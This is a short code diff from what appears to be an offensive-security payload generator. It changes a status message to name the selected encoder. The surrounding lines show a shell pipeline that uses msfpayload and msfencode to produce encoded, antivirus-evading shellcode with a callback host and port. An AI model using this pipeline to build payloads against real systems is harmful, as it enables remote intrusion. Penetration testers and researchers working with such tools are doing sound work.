@@ -85,7 +85,7 @@ while 1:
 		# nothing special just piping through msfencode
 		#
 		if encoding == '1' or encoding == '':
-			PrintInfo("Generating shellcode with x%s shikata_ga_nai. Please wait..." % iterations)
+			PrintInfo("Generating shellcode with x%s %s. Please wait..." % (iterations, encoder))
 			print ""
 			proc = subp.Popen("%s/msfpayload %s LHOST=%s LPORT=%s R | %s/msfencode -c %s -e %s -t c | tr -d '\"' | tr -d '\n' | sed 's/unsigned char buf\[\] \= //'" \
 								% (path, payload, ip, port, path, iterations, encoder), shell=True, stdout=subp.PIPE)
